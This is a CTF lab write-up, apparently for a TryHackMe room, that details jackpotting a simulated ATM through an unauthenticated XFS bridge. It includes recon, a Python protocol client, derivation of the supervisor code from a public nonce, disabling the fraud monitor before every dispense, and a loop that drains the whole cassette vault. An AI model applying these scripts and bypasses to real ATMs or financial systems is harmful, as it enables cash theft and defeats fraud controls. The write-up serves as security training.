# Jackpot Earth's National Bank — Terminal 004 (XFS CDM Cash-Out) — TryHackMe Writeup


> **TL;DR:** An unauthenticated XFS "bridge" on TCP `9100` speaks the ATM's native CEN/XFS cash-dispenser protocol. A downloadable service tool derives the supervisor activation code from the on-screen session nonce. Arming supervisor mode, disabling the fraud monitor, and issuing chunked `WFS_CMD_CDM_DISPENSE` calls drains all 280 notes and releases the flag.


---

<img width="1897" height="354" alt="image" src="https://github.com/user-attachments/assets/c1bdad2b-0bb0-48b0-b273-a1c9d1db10ec" />

---


## Table of Contents

1. Machine Overview
    
2. Reconnaissance
    
3. Understanding the XFS Bridge Protocol
    
4. The Web Console & Service Tool
    
5. Supervisor Arming
    
6. Defeating the Fraud Monitor
    
7. The Dispense Primitive
    
8. Full Cash-Out
    
9. Retrieving the Flag
    
10. Root Cause Analysis
    
11. Remediation
    
12. Appendix: Full Scripts


---

## Reconnaissance

```
nmap -sCV -Pn 10.114.159.188 -p-
```

```ruby
└─$ nmap -sCV -Pn 10.114.159.188 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-24 13:31 UTC
Nmap scan report for 10.114.159.188
Host is up (0.072s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e4:13:81:0c:19:c1:b3:86:e3:6b:5c:78:d1:62:20:54 (ECDSA)
|_  256 07:1a:25:92:c7:6c:e0:9a:75:ca:e8:f6:ad:28:5a:ec (ED25519)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
|_http-title: Earth's National Bank \xE2\x80\x94 Terminal 004 Engineering Console
|_http-server-header: BaseHTTP/0.6 Python/3.12.3
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.29 seconds
                                                                                   
```



- `22` — SSH, likely not the intended path (no creds yet).
    
- `8080` — a Python `BaseHTTPServer` serving the **Terminal 004 Engineering Console**.
    
- `9100` — labelled `jetdirect` (raw printing port by convention), but on an ATM this is the interesting one: it's the **XFS bridge**.

---

### The Web Console (8080)



Browsing `http://10.114.159.188:8080/` reveals the engineering console:

- **Terminal Status** panel: supervisor mode, fraud monitor, terminal lock state, plus a live `Session code: <nonce>`.
    
- **Cash Dispenser Module — Cassette Levels:** four cassettes `CST1`–`CST4` with denominations `$10/$20/$50/$100` and counts `100/80/60/40` = **280 notes**.
    
- **Engineering Tools:** a download link `/jackpot` for the "service tool".
    

The page polls `/status` every 700 ms:

```
curl -s http://10.114.159.188:8080/status | jq
```

```json
{
  "nonce": "845448",
  "armed": false,
  "monitor_on": true,
  "locked": false,
  "lock_remaining": 0,
  "screen": "INSERT CARD",
  "dispensed_total": 0,
  "remaining_notes": 280,
  "vault_total_notes": 280,
  "cassettes": [
    { "id": "CST1", "denom": 10,  "count": 100 },
    { "id": "CST2", "denom": 20,  "count": 80  },
    { "id": "CST3", "denom": 50,  "count": 60  },
    { "id": "CST4", "denom": 100, "count": 40  }
  ],
  "flag_released": false
}
```

<img width="1422" height="605" alt="image" src="https://github.com/user-attachments/assets/30c30be6-930f-4763-928b-0d849716e34c" />



Key fields to track throughout the exploit:

|Field|Meaning|
|---|---|
|`nonce`|6-digit session code; **rotates**, feeds the activation-code derivation|
|`armed`|Supervisor mode on/off|
|`monitor_on`|Fraud monitor active/disabled|
|`locked` / `lock_remaining`|Terminal lock and auto-recovery timer|
|`remaining_notes`|Notes left across all cassettes|
|`flag_released`|Set true once vault is empty|


---


### The Service Tool

```
curl -O http://10.114.159.188:8080/jackpot
chmod +x jackpot
strings jackpot
```


> The tool takes the **6-digit session code** shown on the ATM screen and prints an **8-digit activation code** — i.e. the supervisor activation code is _derived deterministically from the public nonce_. It was never a secret.


<img width="967" height="242" alt="image" src="https://github.com/user-attachments/assets/7092da0e-98bd-4d18-9bfb-ecd01309d50a" />




---


## Understanding the XFS Bridge Protocol

```
nc 10.114.159.188 9100
```

```json
{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)",
  "msg_types": { "GETINFO": "0x01", "EXECUTE": "0x02" },
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
```


<img width="1574" height="147" alt="image" src="https://github.com/user-attachments/assets/64fe2160-74a0-4f27-b446-f6ec5e7ad265" />


----


###  Frame Formats

**Request:**

```text

+--------+------------------+------------------+------------------+
| msg_type |   command id   |     length       |      data        |
| 1 byte   | 4 bytes BE     | 2 bytes BE       | <length> bytes   |
+--------+------------------+------------------+------------------+
```

**Reply:**

```text

+------------------+----------------------------------+
|     length       |            JSON body             |
| 2 bytes BE       |         <length> bytes           |
+------------------+----------------------------------+
```

The banner itself arrives as a reply-framed JSON blob. So every new connection must first **drain the 2-byte-length-prefixed banner** before sending a request.


---

### Reusable Client


```python
# xfs.py
import socket, struct, json

HOST, PORT = "10.114.159.188", 9100

def recv_frame(sock):
    hdr = sock.recv(2)
    if len(hdr) < 2:
        return None
    (ln,) = struct.unpack(">H", hdr)
    buf = b""
    while len(buf) < ln:
        chunk = sock.recv(ln - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf

def send(msg_type, cmd_id, data=b"", banner=True):
    s = socket.create_connection((HOST, PORT), timeout=5)
    if banner:
        recv_frame(s)                      # drain the banner
    pkt = struct.pack(">BIH", msg_type, cmd_id, len(data)) + data
    s.sendall(pkt)
    reply = recv_frame(s)
    s.close()
    return json.loads(reply)
```

---

### Enumerating Commands


Per the banner hint, query `WFS_INF_CDM_CAPABILITIES` (`0x0304`) with `GETINFO` (`0x01`):

```bash

python3 - <<'EOF'
from xfs import send
import json
print(json.dumps(send(0x01, 0x0304), indent=2))
EOF

```

```json

{
  "rc": "WFS_SUCCESS",
  "interface": "Branch Engineering Gateway (XFS bridge)",
  "device_class": "CDM",
  "commands": {
    "WFS_INF_CDM_STATUS":          "0x301",
    "WFS_INF_CDM_CASH_UNIT_INFO":  "0x303",
    "WFS_INF_CDM_CAPABILITIES":    "0x304",
    "WFS_CMD_CDM_DISPENSE":        "0x401",
    "WFS_CMD_CDM_ARM":             "0x4f0",
    "WFS_CMD_CDM_SET_MONITOR":     "0x4f1",
    "WFS_CMD_CDM_GET_FLAG":        "0x4ff"
  },
  "max_dispense": 40
}
```


This is the **map of the entire device**. Two facts stand out:

- `WFS_CMD_CDM_ARM` (`0x4f0`) — supervisor arming command.
    
- `max_dispense: 40` — a single dispense is capped at 40 notes, so 280 notes needs **7 calls**.



<img width="1044" height="320" alt="image" src="https://github.com/user-attachments/assets/12c5bb61-15df-4788-ad8e-e3f71fd3d572" />


---


## The Web Console & Service Tool

The `/status` JSON is the ground truth for state. The `nonce` is what feeds `jackpot`. Re-check it right before deriving a code, because **it rotates**.

```bash
curl -s http://10.114.159.188:8080/status | jq -r '.nonce'
```

Generate the activation code:

```bash
./jackpot 175518
```

```text
[*] session nonce : 175518
[*] activation code: 29876643
```

<img width="1339" height="354" alt="image" src="https://github.com/user-attachments/assets/794b37e5-aee8-40bc-9471-3569cde03b18" />

<img width="728" height="120" alt="image" src="https://github.com/user-attachments/assets/896f5bd5-10e8-4ff3-9c24-eb0a75027374" />


---


## Supervisor Arming

`WFS_CMD_CDM_ARM` (`0x4f0`) expects the 8-digit code. Three encodings were tested:

```python

from xfs import send
import json, struct
code = 39071175
print("A", send(0x02, 0x4f0, str(code).encode()))              # ASCII digits
print("B", send(0x02, 0x4f0, struct.pack(">I", code)))          # 4-byte BE
print("C", send(0x02, 0x4f0, json.dumps({"code": code}).encode()))  # JSON
```

**Results:**

|Variant|Encoding|Result|
|---|---|---|
|**A**|raw ASCII digits|`WFS_SUCCESS: armed - supervisor mode` ✅|
|B|4-byte big-endian uint32|`WFS_ERR_CDM_INVALIDCODE` ❌|
|C|JSON `{"code": …}`|`WFS_ERR_CDM_INVALIDCODE` ❌|

Confirm state:

```bash

curl -s http://10.114.159.188:8080/status | jq '.armed, .monitor_on'
# true
# true
```


Supervisor mode is **ON**. The fraud monitor is still on — that's next.

---




## Defeating the Fraud Monitor

`WFS_CMD_CDM_SET_MONITOR` (`0x4f1`) controls the fraud monitor. Several encodings were tried, checking `/status` after each:

|Payload|Resulting `monitor_on`|
|---|---|
|`b"0"`|**False** ✅|
|`b"off"`|False ✅|
|`b"\x30"`|False ✅|
|`json.dumps(False)`|True ❌|
|`json.dumps({"monitor": False})`|True ❌|
|`b""`|True ❌|

So `b"0"` (or `b"off"`) disables it:

```python

from xfs import send
print(send(0x02, 0x4f1, b"0"))
# {'rc': 'WFS_SUCCESS', 'monitor_on': False}
```

### ⚠️ Critical behaviour: the monitor re-arms itself

After the first dispense, the monitor came back **ON** and subsequent malformed dispenses returned:

```json

{ "rc": "WFS_ERR_CDM_LOCKED",
  "detail": "anomalous dispense with null transaction id -> machine locked",
  "lock_seconds": 45 }
```


and the terminal entered a locked state. A lock **resets the whole machine** — vault back to 280 notes, `armed: false`, new nonce. So the monitor must be turned off **immediately before every single dispense**, and the whole chain must run in one unbroken loop.



---

##  The Dispense Primitive

`WFS_CMD_CDM_DISPENSE` (`0x401`) payload shape had to be discovered. Four candidates were probed (with a 1-note intent, though the bridge caps at 40):

|Shape|Result|
|---|---|
|`{"cassettes":[{"id":"CST1","count":1}]}`|`WFS_SUCCESS`, notes=40 ✅|
|`{"cassettes":[{"denom":10,"count":1}]}`|`WFS_ERR_CDM_LOCKED` — "anomalous dispense with null transaction id" ❌|
|`{"amount":10}`|`WFS_ERR_CDM_LOCKED` ❌|
|`{"id":"CST1","count":1}`|`WFS_ERR_CDM_LOCKED` ❌|

**Only the `cassettes` list shape is accepted.** Note that the bridge **ignores the `count` beyond `max_dispense`** and dispenses the highest denomination first: a single `CST1`-labelled request of 40 actually drained **CST4 ($100)** completely. So cassette `id` is essentially cosmetic — the device pulls up to 40 notes, highest denomination first.

Confirm with cash unit info:

```bash

python3 - <<'EOF'
from xfs import send
import json
print(json.dumps(send(0x01, 0x0303), indent=2))
EOF
```

```json

{
  "rc": "WFS_SUCCESS",
  "cassettes": [
    { "id": "CST1", "denom": 10,  "count": 100 },
    { "id": "CST2", "denom": 20,  "count": 80  },
    { "id": "CST3", "denom": 50,  "count": 60  },
    { "id": "CST4", "denom": 100, "count": 40  }
  ],
  "remaining_notes": 280
}

```

<img width="1365" height="543" alt="image" src="https://github.com/user-attachments/assets/03f1691d-d658-4b31-9be6-aa9e3c8b67e1" />


---




## Full Cash-Out

With arming understood, the monitor toggle known, and the dispense shape confirmed, the entire exploit runs in **one Python process** so the monitor can't sneak back between calls.

### 8.1 Re-arm

Re-fetch the (possibly rotated) nonce and derive a fresh code:

```bash

curl -s http://10.114.159.188:8080/status | jq -r '.nonce'
```

```bash

./jackpot 175518
# activation code: 29876643
```

```bash

python3 - <<'EOF'
from xfs import send
print(send(0x02, 0x4f0, b"29876643"))
EOF
```

### The Loop

```bash

python3 - <<'EOF'
from xfs import send
import json, time, urllib.request
def status():
    return json.load(urllib.request.urlopen("http://10.114.159.188:8080/status"))
for i in range(10):
    s = status()
    if s["locked"]:
        print("locked, waiting", s["lock_remaining"])
        time.sleep(s["lock_remaining"] + 2)
        continue
    if s["remaining_notes"] == 0:
        print("VAULT EMPTY")
        break
    if not s["armed"]:
        print("NOT ARMED — re-arm needed")
        break
    send(0x02, 0x4f1, b"0")                       # monitor OFF before EVERY dispense
    n = min(40, s["remaining_notes"])
    payload = json.dumps({"cassettes": [{"id": "CST1", "count": n}]}).encode()
    r = send(0x02, 0x401, payload)
    print(f"dispense {n} -> {r}")
    time.sleep(0.2)
print("final:", {k: status()[k] for k in
      ("remaining_notes", "dispensed_total", "armed", "monitor_on", "locked", "flag_released")})
EOF
```

###  Output

```text

dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 4000, 'remaining_notes': 240}
dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 2000, 'remaining_notes': 200}
dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 1400, 'remaining_notes': 160}
dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 800,  'remaining_notes': 120}
dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 600,  'remaining_notes': 80}
dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 400,  'remaining_notes': 40}
dispense 40 -> {'rc': 'WFS_SUCCESS', 'notes': 40, 'value': 400,  'remaining_notes': 0,
                'detail': 'vault empty - cashout proven; GET_FLAG now available'}
VAULT EMPTY
final: {'remaining_notes': 0, 'dispensed_total': 280, 'armed': True,
        'monitor_on': False, 'locked': False, 'flag_released': True}

All **280 notes / $12,000** dispensed in 7 calls. `flag_released: true`.
```

<img width="1507" height="258" alt="image" src="https://github.com/user-attachments/assets/0fcfe844-182d-4771-8a53-4cd6631e8442" />


###  Why the earlier attempt failed

The first attempt kept `monitor_off()` outside the loop and used `time.sleep(0.3)` between commands. The monitor re-armed between dispenses and the next malformed request tripped the anomaly detector, locking the machine and **resetting the vault**. The fix was: **monitor off before every dispense, only the accepted payload shape, all in one process.**

---


## Retrieving the Flag

`WFS_CMD_CDM_GET_FLAG` (`0x4ff`):

```bash

python3 - <<'EOF'
from xfs import send
print(send(0x01, 0x4ff))
EOF
```

If `GETINFO` errors, retry with `EXECUTE`:

```bash

python3 - <<'EOF'
from xfs import send
print(send(0x02, 0x4ff))
EOF
```

The web console also shows the green flag box once `flag_released` is true:

```bash

curl -s http://10.114.159.188:8080/status | jq '.flag_released'
```

<img width="875" height="166" alt="image" src="https://github.com/user-attachments/assets/bbd29308-01dd-4ae3-8002-22463c81d286" />

































































